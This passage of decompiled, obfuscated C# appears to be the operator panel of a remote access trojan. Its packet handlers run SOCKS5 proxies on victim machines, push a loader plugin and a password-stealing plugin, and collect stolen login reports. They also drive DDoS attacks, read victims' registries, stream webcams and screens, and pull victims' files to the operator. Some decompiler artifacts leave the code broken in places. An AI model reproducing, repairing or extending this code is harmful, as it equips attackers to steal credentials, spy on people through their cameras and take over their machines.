																	else if (Operators.CompareString(left2, "socks5_srv_start", true) == 0)
																	{
																		Class130.fSocks5_0.method_1(cclient7.sKey, cclient7.sUser, class2.class152_0.string_0[0], class2.class152_0.string_0[1]);
																	}
																	else if (Operators.CompareString(left2, "socks5_srv_stop", true) == 0)
																	{
																		Class130.fSocks5_0.method_2(cclient7.sKey);
																	}
																	else if (Operators.CompareString(left2, "socks5_srv_stats", true) == 0)
																	{
																		Class130.fSocks5_0.method_3(cclient7.sKey, class2.class152_0.string_0);
																	}
																	else
																	{
																		if (Operators.CompareString(left2, "plg_loader", true) == 0)
																		{
																			string sKey12 = cclient7.sKey;
																			string[] array12 = new string[6];
																			array12[0] = "plg_loader_data|";
																			array12[1] = class2.class152_0.string_0[0];
																			array12[2] = "|";
																			int num74 = 3;
																			string text = Application.StartupPath + "\\data\\plugins\\loader.plg";
																			array12[num74] = Class136.smethod_29(ref text);
																			array12[4] = "|";
																			int num75 = 5;
																			text = Application.StartupPath + "\\data\\plugins\\loader.plg";
																			array12[num75] = Class136.smethod_13(ref text);
																			string string_17 = string.Concat(array12);
																			string string_18 = sKey12;
																			Class136.Class138 class4 = new Class136.Class138();
																			class4.string_0 = string_18;
																			class4.string_1 = string_17;
																			class4.long_0 = 0L;
																			try
																			{
																				if (Class130.concurrentDictionary_3.ContainsKey(class4.string_0))
																				{
																					new Thread(new ThreadStart(class4._Lambda$__0)).Start();
																				}
																				goto IL_70F8;
																			}
																			catch (Exception ex42)
																			{
																				goto IL_70F8;
																			}
																		}
																		if (Operators.CompareString(left2, "crd_logins_req", true) == 0)
																		{
																			if (Operators.CompareString(class2.class152_0.string_0[0], "0", true) != 0)
																			{
																				goto IL_70F8;
																			}
																			string sKey13 = cclient7.sKey;
																			string str27 = "crd_logins_data|";
																			string text = Application.StartupPath + "\\data\\plugins\\pws.plg";
																			string str28 = Class136.smethod_29(ref text);
																			string str29 = "|";
																			text = Application.StartupPath + "\\data\\plugins\\pws.plg";
																			string string_17 = str27 + str28 + str29 + Class136.smethod_13(ref text);
																			string string_18 = sKey13;
																			Class136.Class138 class4 = new Class136.Class138();
																			class4.string_0 = string_18;
																			class4.string_1 = string_17;
																			class4.long_0 = 0L;
																			try
																			{
																				if (Class130.concurrentDictionary_3.ContainsKey(class4.string_0))
																				{
																					new Thread(new ThreadStart(class4._Lambda$__0)).Start();
																				}
																				goto IL_70F8;
																			}
																			catch (Exception ex43)
																			{
																				goto IL_70F8;
																			}
																		}
																		if (Operators.CompareString(left2, "crd_logins", true) == 0)
																		{
																			if (cclient7.fDB == null)
																			{
																				CClient cclient144 = cclient7;
																				bool flag = true;
																				cclient144.SOCKET_DISCONNECT(ref flag);
																				goto IL_7149;
																			}
																			cclient7.fDB.method_2(ref class2.class152_0.string_0[0]);
																		}
																		else
																		{
																			if (Operators.CompareString(left2, "crd_logins_report_req", true) == 0)
																			{
																				if (Operators.CompareString(class2.class152_0.string_0[0], "0", true) != 0)
																				{
																					goto IL_70F8;
																				}
																				string sKey14 = cclient7.sKey;
																				string str30 = "crd_logins_report_data|";
																				string text = Application.StartupPath + "\\data\\plugins\\pws.plg";
																				string str31 = Class136.smethod_29(ref text);
																				string str32 = "|";
																				text = Application.StartupPath + "\\data\\plugins\\pws.plg";
																				string string_17 = str30 + str31 + str32 + Class136.smethod_13(ref text);
																				string string_18 = sKey14;
																				Class136.Class138 class4 = new Class136.Class138();
																				class4.string_0 = string_18;
																				class4.string_1 = string_17;
																				class4.long_0 = 0L;
																				try
																				{
																					if (Class130.concurrentDictionary_3.ContainsKey(class4.string_0))
																					{
																						new Thread(new ThreadStart(class4._Lambda$__0)).Start();
																					}
																					goto IL_70F8;
																				}
																				catch (Exception ex44)
																				{
																					goto IL_70F8;
																				}
																			}
																			if (Operators.CompareString(left2, "crd_logins_report", true) == 0)
																			{
																				Class130.fCredentialsLogins_0.method_3(cclient7.sKey, cclient7.sIP + "^" + cclient7.sUser, class2.class152_0.string_0[0]);
																			}
																			else if (Operators.CompareString(left2, "remotebrowser_info", true) == 0)
																			{
																				if (cclient7.fDB == null)
																				{
																					CClient cclient145 = cclient7;
																					bool flag = true;
																					cclient145.SOCKET_DISCONNECT(ref flag);
																					goto IL_7149;
																				}
																				cclient7.fDB.method_98(ref class2.class152_0.string_0[0]);
																			}
																			else if (Operators.CompareString(left2, "remotebrowser_error", true) == 0)
																			{
																				if (cclient7.fDB == null)
																				{
																					CClient cclient146 = cclient7;
																					bool flag = true;
																					cclient146.SOCKET_DISCONNECT(ref flag);
																					goto IL_7149;
																				}
																				cclient7.fDB.method_99(ref class2.class152_0.string_0[0]);
																			}
																			else if (Operators.CompareString(left2, "remotebrowser_stop", true) == 0)
																			{
																				if (cclient7.fDB == null)
																				{
																					CClient cclient147 = cclient7;
																					bool flag = true;
																					cclient147.SOCKET_DISCONNECT(ref flag);
																					goto IL_7149;
																				}
																				cclient7.fDB.method_97();
																			}
																			else if (Operators.CompareString(left2, "speedtest", true) == 0)
																			{
																				cclient7.sBandwidthDL = class2.class152_0.string_0[0];
																			}
																			else if (Operators.CompareString(left2, "speedtest_started", true) == 0)
																			{
																				cclient7.BANDWIDTHDL = "...";
																			}
																			else if (Operators.CompareString(left2, "soft_list", true) == 0)
																			{
																				if (cclient7.fDB == null)
																				{
																					CClient cclient148 = cclient7;
																					bool flag = true;
																					cclient148.SOCKET_DISCONNECT(ref flag);
																					goto IL_7149;
																				}
																				new Thread(new ThreadStart(class2.class152_0._Lambda$__17)).Start();
																			}
																			else if (Operators.CompareString(left2, "thumb_data", true) == 0)
																			{
																				if (cclient7.fDB == null)
																				{
																					CClient cclient149 = cclient7;
																					bool flag = true;
																					cclient149.SOCKET_DISCONNECT(ref flag);
																					goto IL_7149;
																				}
																				cclient7.fDB.fThumb_0.method_2();
																				MemoryStream stream4 = new MemoryStream(Convert.FromBase64String(class2.class152_0.string_0[0]));
																				cclient7.fDB.fThumb_0.vmethod_0().Image = Image.FromStream(stream4);
																			}
																			else if (Operators.CompareString(left2, "ddos_stats", true) == 0)
																			{
																				if (Class130.fDDOS_0.Visible)
																				{
																					Class130.fDDOS_0.method_1(cclient7.sKey, class2.class152_0.string_0);
																				}
																			}
																			else if (Operators.CompareString(left2, "ddos_stop", true) == 0)
																			{
																				Class130.fDDOS_0.method_2(cclient7.sKey);
																			}
																			else if (Operators.CompareString(left2, "reg_hkeys_get", true) == 0)
																			{
																				if (cclient7.fDB == null)
																				{
																					CClient cclient150 = cclient7;
																					bool flag = true;
																					cclient150.SOCKET_DISCONNECT(ref flag);
																					goto IL_7149;
																				}
																				new Thread(new ThreadStart(class2.class152_0._Lambda$__18)).Start();
																			}
																			else if (Operators.CompareString(left2, "reg_keys_get", true) == 0)
																			{
																				if (cclient7.fDB == null)
																				{
																					CClient cclient151 = cclient7;
																					bool flag = true;
																					cclient151.SOCKET_DISCONNECT(ref flag);
																					goto IL_7149;
																				}
																				new Thread(new ThreadStart(class2.class152_0._Lambda$__19)).Start();
																			}
																			else if (Operators.CompareString(left2, "scr_tb", true) == 0)
																			{
																				if (Class135.smethod_0().UIThumbnails)
																				{
																					MemoryStream stream5 = new MemoryStream(Convert.FromBase64String(class2.class152_0.string_0[0]));
																					cclient7.ICO_STATUS = Image.FromStream(stream5);
																					Class130.imageList_1.Images.Add(cclient7.sKey, cclient7.ICO_STATUS);
																					Class130.fMain_0.method_5(true);
																				}
																			}
																			else if (Operators.CompareString(left2, "dl_dir_obj_count", true) == 0)
																			{
																				Class130.concurrentDictionary_1.TryAdd(class2.class152_0.string_0[0], (int)Math.Round(Conversion.Val(class2.class152_0.string_0[1])));
																			}
																			else if (cclient7.fDB == null)
																			{
																				CClient cclient152 = cclient7;
																				bool flag = true;
																				cclient152.SOCKET_DISCONNECT(ref flag);
																				goto IL_7149;
																			}
																		}
																	}
																}
															}
														}
														IL_70F8:
														fMain ff10 = cclient7.ff;
														CClient cclient153 = cclient7;
														ptr4 = ref cclient153.sKey;
														object value2 = cclient153.sKey;
														ff10.method_24(ref value2);
														ptr4 = Conversions.ToString(value2);
													}
													catch (Exception ex45)
													{
														Class130.concurrentDictionary_3[cclient7.sKey].sPacket.Clear();
													}
													IL_7149:
													cclient2.sock_async.method_6(Encoding.UTF8.GetBytes("1"));
													ptr2 = ref Class130.struct20_0.double_3;
												}
												Class130.struct20_0.double_3 = ptr2 + 1.0;
												CClient cclient154 = Class130.concurrentDictionary_3[cclient2.SOCKET_COMMAND_USER_KEY];
												ptr2 = ref cclient154.stats_bytes_out;
												cclient154.stats_bytes_out = ptr2 + 1.0;
												CClient cclient155 = cclient2;
												bool flag3 = true;
												cclient155.SOCKET_DISCONNECT(ref flag3);
											}
										}
									}
								}
								catch (Exception ex46)
								{
									CClient cclient156 = cclient2;
									bool flag3 = false;
									cclient156.SOCKET_DISCONNECT(ref flag3);
								}
								return;
							}
							if (Operators.CompareString(left, "WB_ST", true) == 0)
							{
								try
								{
									string[] array9 = Strings.Split(text14, "|", 3, CompareMethod.Text);
									cclient2.sock_async.socket_0.ReceiveBufferSize = Class135.smethod_0().TransfersRecvBytes;
									cclient2.WEBCAMSTREAM_ACTIVE = true;
									cclient2.WEBCAMSTREAM_USER_KEY = array9[1];
									ref double ptr2 = ref Class130.struct20_0.double_2;
									Class130.struct20_0.double_2 = ptr2 + (double)num;
									ptr2 = ref Class130.struct20_0.double_4;
									Class130.struct20_0.double_4 = ptr2 + 1.0;
									string key = cclient2.WEBCAMSTREAM_USER_KEY;
									bool flag5;
									try
									{
										flag5 = Class130.concurrentDictionary_3.ContainsKey(key);
										goto IL_7274;
									}
									catch (Exception ex47)
									{
									}
									flag5 = false;
									IL_7274:
									if (!flag5)
									{
										CClient cclient157 = cclient2;
										bool flag3 = false;
										cclient157.SOCKET_DISCONNECT(ref flag3);
									}
									else
									{
										if (array9[2].Length > 0)
										{
											cclient2.sPacket.Append(array9[2]);
										}
										CClient cclient158 = Class130.concurrentDictionary_3[cclient2.WEBCAMSTREAM_USER_KEY];
										ptr2 = ref cclient158.stats_bytes_in;
										cclient158.stats_bytes_in = ptr2 + (double)num;
										Class130.concurrentDictionary_3[cclient2.WEBCAMSTREAM_USER_KEY].WEBCAMSTREAM_SOCKET_ID = cclient2.sKey;
									}
								}
								catch (Exception ex48)
								{
									CClient cclient159 = cclient2;
									bool flag3 = false;
									cclient159.SOCKET_DISCONNECT(ref flag3);
								}
								return;
							}
							if (Operators.CompareString(left, "WC_PR_ST", true) == 0)
							{
								try
								{
									string[] array9 = Strings.Split(text14, "|", 3, CompareMethod.Text);
									cclient2.sock_async.socket_0.ReceiveBufferSize = Class135.smethod_0().TransfersRecvBytes;
									cclient2.WEBCAM_PREVIEW_ACTIVE = true;
									cclient2.WEBCAM_PREVIEW_USER_KEY = array9[1];
									ref double ptr2 = ref Class130.struct20_0.double_2;
									Class130.struct20_0.double_2 = ptr2 + (double)num;
									ptr2 = ref Class130.struct20_0.double_4;
									Class130.struct20_0.double_4 = ptr2 + 1.0;
									string key = cclient2.WEBCAM_PREVIEW_USER_KEY;
									bool flag5;
									try
									{
										flag5 = Class130.concurrentDictionary_3.ContainsKey(key);
										goto IL_73A6;
									}
									catch (Exception ex49)
									{
									}
									flag5 = false;
									IL_73A6:
									if (!flag5)
									{
										CClient cclient160 = cclient2;
										bool flag3 = false;
										cclient160.SOCKET_DISCONNECT(ref flag3);
									}
									else
									{
										Class130.concurrentDictionary_3[cclient2.WEBCAM_PREVIEW_USER_KEY].fPr.method_16();
										Class130.concurrentDictionary_3[cclient2.WEBCAM_PREVIEW_USER_KEY].fPr.string_1 = cclient2.sKey;
										if (array9[2].Length > 0)
										{
											cclient2.sPacket.Append(array9[2]);
										}
										CClient cclient161 = Class130.concurrentDictionary_3[cclient2.WEBCAM_PREVIEW_USER_KEY];
										ptr2 = ref cclient161.stats_bytes_in;
										cclient161.stats_bytes_in = ptr2 + (double)num;
										Class130.concurrentDictionary_3[cclient2.WEBCAM_PREVIEW_USER_KEY].WEBCAM_PREVIEW_SOCKET_ID = cclient2.sKey;
									}
								}
								catch (Exception ex50)
								{
									CClient cclient162 = cclient2;
									bool flag3 = false;
									cclient162.SOCKET_DISCONNECT(ref flag3);
								}
								return;
							}
							if (Operators.CompareString(left, "RB_ST", true) == 0)
							{
								try
								{
									cclient2.sock_async.socket_0.ReceiveBufferSize = Class135.smethod_0().TransfersRecvBytes;
									string[] array9 = Strings.Split(text14, "|", 3, CompareMethod.Text);
									cclient2.REMOTE_BROWSER_ACTIVE = true;
									cclient2.REMOTE_BROWSER_USER_KEY = array9[1];
									CClient cclient163 = Class130.concurrentDictionary_3[cclient2.REMOTE_BROWSER_USER_KEY];
									ref double ptr2 = ref cclient163.stats_bytes_in;
									cclient163.stats_bytes_in = ptr2 + (double)num;
									Class130.concurrentDictionary_3[cclient2.REMOTE_BROWSER_USER_KEY].REMOTE_BROWSER_SOCKET_ID = cclient2.sKey;
									ptr2 = ref Class130.struct20_0.double_2;
									Class130.struct20_0.double_2 = ptr2 + (double)num;
									ptr2 = ref Class130.struct20_0.double_4;
									Class130.struct20_0.double_4 = ptr2 + 1.0;
									string key = cclient2.REMOTE_BROWSER_USER_KEY;
									bool flag5;
									try
									{
										flag5 = Class130.concurrentDictionary_3.ContainsKey(key);
										goto IL_7551;
									}
									catch (Exception ex51)
									{
									}
									flag5 = false;
									IL_7551:
									if (!flag5)
									{
										CClient cclient164 = cclient2;
										bool flag3 = false;
										cclient164.SOCKET_DISCONNECT(ref flag3);
										return;
									}
									if (array9[2].Length > 0)
									{
										cclient2.sPacket.Append(array9[2]);
									}
									goto IL_DF07;
								}
								catch (Exception ex52)
								{
									CClient cclient165 = cclient2;
									bool flag3 = false;
									cclient165.SOCKET_DISCONNECT(ref flag3);
									return;
								}
							}
							if (Operators.CompareString(left, "SC_PR_ST", true) == 0)
							{
								try
								{
									cclient2.sock_async.socket_0.ReceiveBufferSize = Class135.smethod_0().TransfersRecvBytes;
									string[] array9 = Strings.Split(text14, "|", 3, CompareMethod.Text);
									cclient2.SCREEN_PREVIEW_ACTIVE = true;
									cclient2.SCREEN_PREVIEW_USER_KEY = array9[1];
									Class130.concurrentDictionary_3[cclient2.SCREEN_PREVIEW_USER_KEY].fPr.method_16();
									Class130.concurrentDictionary_3[cclient2.SCREEN_PREVIEW_USER_KEY].fPr.string_1 = cclient2.sKey;
									ref double ptr2 = ref Class130.struct20_0.double_2;
									Class130.struct20_0.double_2 = ptr2 + (double)num;
									ptr2 = ref Class130.struct20_0.double_4;
									Class130.struct20_0.double_4 = ptr2 + 1.0;
									string key = cclient2.SCREEN_PREVIEW_USER_KEY;
									bool flag5;
									try
									{
										flag5 = Class130.concurrentDictionary_3.ContainsKey(key);
										goto IL_7682;
									}
									catch (Exception ex53)
									{
									}
									flag5 = false;
									IL_7682:
									if (!flag5)
									{
										CClient cclient166 = cclient2;
										bool flag3 = false;
										cclient166.SOCKET_DISCONNECT(ref flag3);
									}
									else
									{
										if (array9[2].Length > 0)
										{
											cclient2.sPacket.Append(array9[2]);
										}
										CClient cclient167 = Class130.concurrentDictionary_3[cclient2.SCREEN_PREVIEW_USER_KEY];
										ptr2 = ref cclient167.stats_bytes_in;
										cclient167.stats_bytes_in = ptr2 + (double)num;
										Class130.concurrentDictionary_3[cclient2.SCREEN_PREVIEW_USER_KEY].SCREEN_PREVIEW_SOCKET_ID = cclient2.sKey;
									}
								}
								catch (Exception ex54)
								{
									CClient cclient168 = cclient2;
									bool flag3 = false;
									cclient168.SOCKET_DISCONNECT(ref flag3);
								}
								return;
							}
							if (Operators.CompareString(left, "FL_DL", true) == 0)
							{
								double ptr2;
								try
								{
									checked
									{
										Class130.long_2 += 1L;
										cclient2.sock_async.socket_0.ReceiveBufferSize = Class135.smethod_0().TransfersRecvBytes;
										cclient2.sock_async.socket_0.LingerState.Enabled = true;
										string[] array9 = Strings.Split(text14, "|", 8, CompareMethod.Text);
										cclient2.FILE_TRANSFER_ID = "i" + cclient2.mSocketCounter;
										cclient2.FILE_TRANSFER_USER_KEY = array9[1];
										cclient2.FILE_TRANSFER_USER = array9[2];
										cclient2.FILE_TRANSFER_FILENAME = Strings.Replace(Encoding.UTF8.GetString(Convert.FromBase64String(array9[3])), ":", string.Empty, 1, -1, CompareMethod.Text);
										cclient2.FILE_TRANSFER_REMOTE_FILE = array9[3];
										cclient2.FILE_TRANSFER_FILESIZE = array9[4];
										cclient2.FILE_TRANSFER_FILE_LAST_MODIFIED = array9[5];
										cclient2.FILE_TRANSFER_GROUP_ID = Encoding.UTF8.GetString(Convert.FromBase64String(array9[6]));
										cclient2.FILE_TRANSFER_LAST_PACKET = Class136.smethod_36();
										cclient2.FILE_TRANSFER_STARTED = (double)Class136.smethod_36();
										ptr2 = ref Class130.struct20_0.double_2;
									}
									Class130.struct20_0.double_2 = ptr2 + (double)num;
									ptr2 = ref Class130.struct20_0.double_4;
									Class130.struct20_0.double_4 = ptr2 + 1.0;
									string key = cclient2.FILE_TRANSFER_USER_KEY;
									bool flag5;
									try
									{
										flag5 = Class130.concurrentDictionary_3.ContainsKey(key);
										goto IL_7874;
									}
									catch (Exception ex55)
									{
									}
									flag5 = false;
									IL_7874:
									if (!flag5)
									{
										CClient cclient169 = cclient2;
										bool flag3 = false;
										cclient169.SOCKET_DISCONNECT(ref flag3);
										return;
									}
									cclient2.FILE_TRANSFER_ACTIVE = true;
									CClient cclient170 = Class130.concurrentDictionary_3[cclient2.FILE_TRANSFER_USER_KEY];
									ptr2 = ref cclient170.stats_bytes_in;
									cclient170.stats_bytes_in = ptr2 + (double)num;
									stringBuilder.Clear();
								}
								catch (Exception ex56)
								{
									CClient cclient171 = cclient2;
									bool flag3 = false;
									cclient171.SOCKET_DISCONNECT(ref flag3);
									return;
								}
								Class130.fTransferManager_0.method_5(cclient2.FILE_TRANSFER_ID, cclient2.sKey, cclient2.FILE_TRANSFER_USER_KEY, cclient2.FILE_TRANSFER_REMOTE_FILE, checked((long)Math.Round(Conversion.Val(cclient2.FILE_TRANSFER_FILESIZE))), string.Concat(new string[]
								{
									Application.StartupPath,
									"\\Downloads\\",
									cclient2.FILE_TRANSFER_USER,
									"\\",
									cclient2.FILE_TRANSFER_FILENAME
								}), cclient2.FILE_TRANSFER_USER, cclient2.FILE_TRANSFER_GROUP_ID);
								Class130.fTransferManager_0.method_16(cclient2.FILE_TRANSFER_ID, 5, "Downloading");
								fMain ff11 = cclient2.ff;
								CClient cclient172 = cclient2;
								ref string ptr11 = ref cclient172.FILE_TRANSFER_USER_KEY;
								object value3 = cclient172.FILE_TRANSFER_USER_KEY;
								ff11.method_24(ref value3);
								ptr11 = Conversions.ToString(value3);
								int num30;
								int num31;
								try
								{
									if (!Class135.smethod_0().TransferReplaceExisting)
									{
										if (File.Exists(string.Concat(new string[]
										{
											Application.StartupPath,
											"\\Downloads\\",
											cclient2.FILE_TRANSFER_USER,
											"\\",
											cclient2.FILE_TRANSFER_FILENAME
										})))
										{
											fTransferManager fTransferManager_10 = Class130.fTransferManager_0;
											string file_TRANSFER_ID10 = cclient2.FILE_TRANSFER_ID;
											int num76 = 2;
											double num77 = Conversions.ToDouble(cclient2.FILE_TRANSFER_FILESIZE);
											bool flag3 = false;
											ref bool ptr10 = ref flag3;
											double num28 = num77;
											int num78 = num76;
											string string_46 = file_TRANSFER_ID10;
											fTransferManager fTransferManager12 = fTransferManager_10;
											string text6;
											object obj21;
											try
											{
												ProjectData.ClearProjectError();
												num30 = 2;
												string text5 = string.Empty;
												if (num28 >= 1099511627776.0)
												{
													text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " TiB";
												}
												else if (num28 >= 1073741824.0)
												{
													text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " GiB";
												}
												else if (num28 >= 1048576.0)
												{
													text5 = Strings.Format(num28 / 1024.0 / 1024.0, "#0.00") + " MiB";
												}
												else if (num28 >= 1024.0)
												{
													text5 = Strings.Format(num28 / 1024.0, "#0.00") + " KiB";
												}
												else if (num28 < 1024.0)
												{
													text5 = Conversions.ToString(Conversion.Fix(num28)) + " B";
												}
												if (ptr10)
												{
													text5 = Strings.Split(text5, " ", -1, CompareMethod.Text)[0];
												}
												if (text5.Length > 0)
												{
													text6 = text5;
												}
												else
												{
													text6 = " 0 B";
												}
												IL_7B81:
												goto IL_7BD1;
												IL_7B83:
												text6 = "0 B";
												goto IL_7B81;
												IL_7B8C:
												num31 = -1;
												@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num30);
												IL_7BA2:;
											}
											catch when (endfilter(obj21 is Exception & num30 != 0 & num31 == 0))
											{
												Exception ex57 = (Exception)obj22;
												goto IL_7B8C;
											}
											throw ProjectData.CreateProjectError(-2146828237);
											IL_7BD1:
											if (num31 != 0)
											{
												ProjectData.ClearProjectError();
											}
											string string_47 = text6;
											fTransferManager12.method_16(string_46, num78, string_47);
											fTransferManager fTransferManager_11 = Class130.fTransferManager_0;
											string file_TRANSFER_ID11 = cclient2.FILE_TRANSFER_ID;
											int num79 = 3;
											double num80 = 0.0;
											flag3 = false;
											ptr10 = ref flag3;
											num28 = num80;
											int num81 = num79;
											string string_48 = file_TRANSFER_ID11;
											fTransferManager fTransferManager13 = fTransferManager_11;
											object obj23;
											try
											{
												ProjectData.ClearProjectError();
												num30 = 2;
												string text5 = string.Empty;
												if (num28 >= 1099511627776.0)
												{
													text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " TiB";
												}
												else if (num28 >= 1073741824.0)
												{
													text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " GiB";
												}
												else if (num28 >= 1048576.0)
												{
													text5 = Strings.Format(num28 / 1024.0 / 1024.0, "#0.00") + " MiB";
												}
												else if (num28 >= 1024.0)
												{
													text5 = Strings.Format(num28 / 1024.0, "#0.00") + " KiB";
												}
												else if (num28 < 1024.0)
												{
													text5 = Conversions.ToString(Conversion.Fix(num28)) + " B";
												}
												if (ptr10)
												{
													text5 = Strings.Split(text5, " ", -1, CompareMethod.Text)[0];
												}
												if (text5.Length > 0)
												{
													text6 = text5;
												}
												else
												{
													text6 = " 0 B";
												}
												IL_7D8B:
												goto IL_7DDB;
												IL_7D8D:
												text6 = "0 B";
												goto IL_7D8B;
												IL_7D96:
												num31 = -1;
												@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num30);
												IL_7DAC:;
											}
											catch when (endfilter(obj23 is Exception & num30 != 0 & num31 == 0))
											{
												Exception ex58 = (Exception)obj24;
												goto IL_7D96;
											}
											throw ProjectData.CreateProjectError(-2146828237);
											IL_7DDB:
											if (num31 != 0)
											{
												ProjectData.ClearProjectError();
											}
											string str33 = text6;
											fTransferManager13.method_16(string_48, num81, str33 + " (0%)");
											Class130.fTransferManager_0.method_16(cclient2.FILE_TRANSFER_ID, 4, "N/A");
											Class130.fTransferManager_0.method_16(cclient2.FILE_TRANSFER_ID, 5, "Ignored (File already exists)");
											Class130.fTransferManager_0.method_16(cclient2.FILE_TRANSFER_ID, 7, "N/A");
											Class130.fTransferManager_0.method_17(cclient2.FILE_TRANSFER_ID);
											Class130.concurrentDictionary_0[cclient2.FILE_TRANSFER_ID].TRANSFER_ACTIVE = false;
											cclient2.FILE_TRANSFER_COMPLETED = true;
											fMain ff12 = cclient2.ff;
											CClient cclient173 = cclient2;
											ptr11 = ref cclient173.FILE_TRANSFER_USER_KEY;
											value3 = cclient173.FILE_TRANSFER_USER_KEY;
											ff12.method_24(ref value3);
											ptr11 = Conversions.ToString(value3);
											cclient2.sock_async.method_6(Encoding.UTF8.GetBytes("0"));
											ptr2 = ref Class130.struct20_0.double_3;
											Class130.struct20_0.double_3 = ptr2 + 1.0;
											CClient cclient174 = Class130.concurrentDictionary_3[cclient2.FILE_TRANSFER_USER_KEY];
											ptr2 = ref cclient174.stats_bytes_out;
											cclient174.stats_bytes_out = ptr2 + 1.0;
											CClient cclient175 = cclient2;
											flag3 = false;
											cclient175.SOCKET_DISCONNECT(ref flag3);
											return;
										}
									}
									else if (Class135.smethod_0().TransferReplaceFilesModified)
									{
										if (File.Exists(string.Concat(new string[]
										{
											Application.StartupPath,
											"\\Downloads\\",
											cclient2.FILE_TRANSFER_USER,
											"\\",
											cclient2.FILE_TRANSFER_FILENAME
										})))
										{
											double num82 = Conversions.ToDouble(cclient2.FILE_TRANSFER_FILESIZE);
											string text15 = string.Concat(new string[]
											{
												Application.StartupPath,
												"\\Downloads\\",
												cclient2.FILE_TRANSFER_USER,
												"\\",
												cclient2.FILE_TRANSFER_FILENAME
											});
											bool flag6 = num82 != (double)Class136.smethod_32(ref text15);
											double num83 = Conversions.ToDouble(cclient2.FILE_TRANSFER_FILE_LAST_MODIFIED);
											text15 = string.Concat(new string[]
											{
												Application.StartupPath,
												"\\Downloads\\",
												cclient2.FILE_TRANSFER_USER,
												"\\",
												cclient2.FILE_TRANSFER_FILENAME
											});
											if (flag6 | num83 == (double)Class136.smethod_16(ref text15))
											{
												fTransferManager fTransferManager_12 = Class130.fTransferManager_0;
												string file_TRANSFER_ID12 = cclient2.FILE_TRANSFER_ID;
												int num84 = 2;
												double num85 = Conversions.ToDouble(cclient2.FILE_TRANSFER_FILESIZE);
												bool flag3 = false;
												ref bool ptr10 = ref flag3;
												double num28 = num85;
												int num86 = num84;
												string string_49 = file_TRANSFER_ID12;
												fTransferManager fTransferManager14 = fTransferManager_12;
												string text6;
												object obj25;
												try
												{
													ProjectData.ClearProjectError();
													num30 = 2;
													string text5 = string.Empty;
													if (num28 >= 1099511627776.0)
													{
														text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " TiB";
													}
													else if (num28 >= 1073741824.0)
													{
														text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " GiB";
													}
													else if (num28 >= 1048576.0)
													{
														text5 = Strings.Format(num28 / 1024.0 / 1024.0, "#0.00") + " MiB";
													}
													else if (num28 >= 1024.0)
													{
														text5 = Strings.Format(num28 / 1024.0, "#0.00") + " KiB";
													}
													else if (num28 < 1024.0)
													{
														text5 = Conversions.ToString(Conversion.Fix(num28)) + " B";
													}
													if (ptr10)
													{
														text5 = Strings.Split(text5, " ", -1, CompareMethod.Text)[0];
													}
													if (text5.Length > 0)
													{
														text6 = text5;
													}
													else
													{
														text6 = " 0 B";
													}
													IL_819C:
													goto IL_81EC;
													IL_819E:
													text6 = "0 B";
													goto IL_819C;
													IL_81A7:
													num31 = -1;
													@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num30);
													IL_81BD:;
												}
												catch when (endfilter(obj25 is Exception & num30 != 0 & num31 == 0))
												{
													Exception ex59 = (Exception)obj26;
													goto IL_81A7;
												}
												throw ProjectData.CreateProjectError(-2146828237);
												IL_81EC:
												if (num31 != 0)
												{
													ProjectData.ClearProjectError();
												}
												string string_50 = text6;
												fTransferManager14.method_16(string_49, num86, string_50);
												fTransferManager fTransferManager_13 = Class130.fTransferManager_0;
												string file_TRANSFER_ID13 = cclient2.FILE_TRANSFER_ID;
												int num87 = 3;
												double num88 = 0.0;
												flag3 = false;
												ptr10 = ref flag3;
												num28 = num88;
												int num89 = num87;
												string string_51 = file_TRANSFER_ID13;
												fTransferManager fTransferManager15 = fTransferManager_13;
												object obj27;
												try
												{
													ProjectData.ClearProjectError();
													num30 = 2;
													string text5 = string.Empty;
													if (num28 >= 1099511627776.0)
													{
														text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " TiB";
													}
													else if (num28 >= 1073741824.0)
													{
														text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " GiB";
													}
													else if (num28 >= 1048576.0)
													{
														text5 = Strings.Format(num28 / 1024.0 / 1024.0, "#0.00") + " MiB";
													}
													else if (num28 >= 1024.0)
													{
														text5 = Strings.Format(num28 / 1024.0, "#0.00") + " KiB";
													}
													else if (num28 < 1024.0)
													{
														text5 = Conversions.ToString(Conversion.Fix(num28)) + " B";
													}
													if (ptr10)
													{
														text5 = Strings.Split(text5, " ", -1, CompareMethod.Text)[0];
													}
													if (text5.Length > 0)
													{
														text6 = text5;
													}
													else
													{
														text6 = " 0 B";
													}
													IL_83A6:
													goto IL_83F6;
													IL_83A8:
													text6 = "0 B";
													goto IL_83A6;
													IL_83B1:
													num31 = -1;
													@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num30);
													IL_83C7:;
												}
												catch when (endfilter(obj27 is Exception & num30 != 0 & num31 == 0))
												{
													Exception ex60 = (Exception)obj28;
													goto IL_83B1;
												}
												throw ProjectData.CreateProjectError(-2146828237);
												IL_83F6:
												if (num31 != 0)
												{
													ProjectData.ClearProjectError();
												}
												string str34 = text6;
												fTransferManager15.method_16(string_51, num89, str34 + " (0%)");
												Class130.fTransferManager_0.method_16(cclient2.FILE_TRANSFER_ID, 4, "N/A");
												Class130.fTransferManager_0.method_16(cclient2.FILE_TRANSFER_ID, 5, "Ignored (File already exists)");
												Class130.fTransferManager_0.method_16(cclient2.FILE_TRANSFER_ID, 7, "N/A");
												Class130.fTransferManager_0.method_17(cclient2.FILE_TRANSFER_ID);
												Class130.concurrentDictionary_0[cclient2.FILE_TRANSFER_ID].TRANSFER_ACTIVE = false;
												cclient2.FILE_TRANSFER_COMPLETED = true;
												fMain ff13 = cclient2.ff;
												CClient cclient176 = cclient2;
												ptr11 = ref cclient176.FILE_TRANSFER_USER_KEY;
												value3 = cclient176.FILE_TRANSFER_USER_KEY;
												ff13.method_24(ref value3);
												ptr11 = Conversions.ToString(value3);
